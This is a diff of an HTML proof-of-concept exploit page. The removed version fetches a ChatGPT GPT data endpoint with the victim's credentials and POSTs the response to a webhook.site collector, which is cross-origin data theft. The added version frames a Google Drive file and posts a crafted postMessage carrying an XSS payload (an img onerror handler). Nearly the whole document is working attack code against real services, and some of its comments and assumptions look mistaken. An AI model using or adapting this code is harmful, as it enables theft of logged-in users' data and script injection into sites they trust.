@@ -1,21 +1,56 @@
 <!DOCTYPE html>
 <html>
-<head><title>CORS+CSRF PoC</title></head>
+<head>
+  <meta charset="UTF-8">
+  <title>Google Drive postMessage Exploit PoC</title>
+  <style>
+    body { font-family: sans-serif; }
+    #status { margin-top: 20px; font-size: 1.2em; color: red; }
+  </style>
+</head>
 <body>
-<script>
-const webhook = "https://webhook.site/d4e97317-32e7-4649-88e3-6b09ca3f4ee9";
+  <h2>Google Drive postMessage Exploit PoC</h2>
+  <p>
+    If vulnerable, Drive will execute injected JavaScript. <br>
+    A red message will appear below if the payload succeeds.
+  </p>
 
-fetch("https://chatgpt.com/g/g-y2KnRe0w4-bug-hunter-gpt.data", {
-    credentials: "include"
-})
-.then(r => r.text())
-.then(body => {
-    fetch(webhook, {
-        method: "POST",
-        headers: { "Content-Type": "text/plain" },
-        body
-    });
-});
-</script>
+  <!-- Victim iframe (replace FILE_ID with your test video) -->
+  <iframe id="victim" 
+          src="https://drive.google.com/file/d/1-8sZYG1WZVbEN2txGkJseHvS88P4nRri/view?usp=sharing" 
+          width="800" height="600">
+  </iframe>
+
+  <div id="status">[Waiting for test result...]</div>
+
+  <script>
+    // This function will be called if exploit succeeds
+    function exploitSuccess() {
+      document.getElementById("status").textContent = 
+        "✅ Exploit succeeded: JS executed inside drive.google.com";
+      document.getElementById("status").style.color = "green";
+    }
+
+    // Payload to inject into Drive
+    const payload = {
+      event: "infoDelivery",
+      info: {
+        videoData: {
+          // Inject JS that calls back to exploitSuccess()
+          title: `<img src=x onerror="parent.exploitSuccess()">`
+        }
+      },
+      channel: "widget",
+      id: 1337
+    };
+
+    // Send payload after iframe loads
+    document.getElementById("victim").onload = function() {
+      document.getElementById("victim").contentWindow.postMessage(
+        JSON.stringify(payload),
+        "*" // attacker-controlled origin
+      );
+    };
+  </script>
 </body>
 </html>
